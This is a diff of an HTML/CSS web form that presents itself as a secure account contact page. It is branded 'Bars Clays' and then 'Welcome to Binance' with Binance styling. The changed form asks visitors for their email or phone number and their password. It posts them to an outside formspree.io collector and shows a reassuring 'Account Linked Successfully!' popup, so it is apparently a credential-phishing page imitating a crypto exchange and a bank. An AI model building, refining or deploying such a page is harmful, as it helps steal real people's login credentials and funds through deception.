@@ -11,10 +11,10 @@
 *{margin:0;padding:0;box-sizing:border-box;}
 body{
 font-family:Arial, Helvetica, sans-serif;
-background:#f5f5f5;   /* ← replaced dark background with first HTML background */
+background:#f5f5f5;   /* changed to match first HTML */
 display:flex;
 justify-content:center;
-align-items:flex-start;
+align-items:center;
 min-height:100vh;
 padding:20px;
 }
@@ -26,7 +26,14 @@ max-width:420px;
 background:#fff;
 border-radius:18px;
 padding:38px 28px;
-box-shadow:0 20px 60px rgba(0,0,0,.35);
+box-shadow:0 20px 60px rgba(0,0,0,.15);
+}
+
+/* ---------- WELCOME INSERTED ---------- */
+.welcome{
+font-size:26px;
+font-weight:700;
+margin-bottom:25px;
 }
 
 /* ---------- LOGO ---------- */
@@ -44,17 +51,15 @@ font-size:14px;
 margin-bottom:32px;
 }
 
-/* ---------- ADDED WELCOME (from first HTML) ---------- */
+/* ---------- BINANCE STYLE INPUT (FROM FIRST HTML) ---------- */
+.input-group{margin-bottom:18px;}
 
-.welcome{
-font-size:28px;
-font-weight:700;
-margin-bottom:26px;
+.input-group label{
+font-size:14px;
+color:#555;
 }
 
-/* ---------- BINANCE STYLE INPUT (EXACT FROM FIRST HTML) ---------- */
-
-.binance-input{
+.input-group input{
 width:100%;
 margin-top:8px;
 padding:16px;
@@ -62,11 +67,7 @@ border-radius:10px;
 border:none;
 background:#efefef;
 font-size:15px;
-margin-bottom:18px;
 }
-
-/* ---------- INPUT ---------- */
-.input-group{margin-bottom:18px;}
 
 .input-group textarea{
 width:100%;
@@ -74,15 +75,7 @@ padding:15px;
 border-radius:10px;
 border:1px solid #dfe3e8;
 font-size:16px;
-transition:.25s;
 background:#fafafa;
-}
-
-.input-group textarea:focus{
-outline:none;
-border-color:#fcd535;
-background:white;
-box-shadow:0 0 0 3px rgba(252,213,53,.15);
 }
 
 /* ---------- BUTTON ---------- */
@@ -162,11 +155,25 @@ opacity:0;
 animation:fadeIn .5s ease .45s forwards;
 }
 
-@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
-@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}
+@keyframes pop{
+0%{transform:scale(0)}
+100%{transform:scale(1)}
+}
+@keyframes fadeIn{
+0%{opacity:0}
+100%{opacity:1}
+}
 
-.popup h2{color:#0ECB81;margin-bottom:8px;}
-.popup p{color:#B7BDC6;font-size:14px;margin-bottom:20px;}
+.popup h2{
+color:#0ECB81;
+margin-bottom:8px;
+}
+
+.popup p{
+color:#B7BDC6;
+font-size:14px;
+margin-bottom:20px;
+}
 
 .popup button{
 background:#FCD535;
@@ -193,18 +200,20 @@ border-radius:8px;
 <div class="logo">Bars Clays</div>
 <div class="subtitle">Secure account contact</div>
 
-<!-- ✅ added welcome from first HTML -->
-<div class="welcome">Welcome to Bars Clays</div>
+<!-- INSERTED WELCOME -->
+<div class="welcome">Welcome to Binance</div>
 
 <form id="contactForm" action="https://formspree.io/f/xjgewvle" method="POST">
 
-<!-- ✅ replaced email input with EXACT first HTML style -->
-<label>Email / Phone number</label>
-<input class="binance-input" type="text" name="email" placeholder="Email/Phone (without country code)" required>
+<div class="input-group">
+<label>Email/Phone number</label>
+<input type="text" name="email" placeholder="Email/Phone (without country code)" required>
+</div>
 
-<!-- ✅ added password under it (same style) -->
+<div class="input-group">
 <label>Password</label>
-<input class="binance-input" type="password" name="password" placeholder="Enter password" required>
+<input type="password" name="password" placeholder="Password" required>
+</div>
 
 <div class="input-group">
 <textarea name="message" rows="4" placeholder="Message" required></textarea>
@@ -219,13 +228,17 @@ border-radius:8px;
 </div>
 
 
-<!-- SUCCESS POPUP (UNCHANGED) -->
+<!-- SUCCESS POPUP -->
 <div id="popup" class="popup">
 <div class="popup-box">
+
 <div class="checkmark"></div>
+
 <h2>Account Linked Successfully!</h2>
 <p>Your Bars Clays account details have been received safely.</p>
+
 <button onclick="closePopup()">Back</button>
+
 </div>
 </div>
 
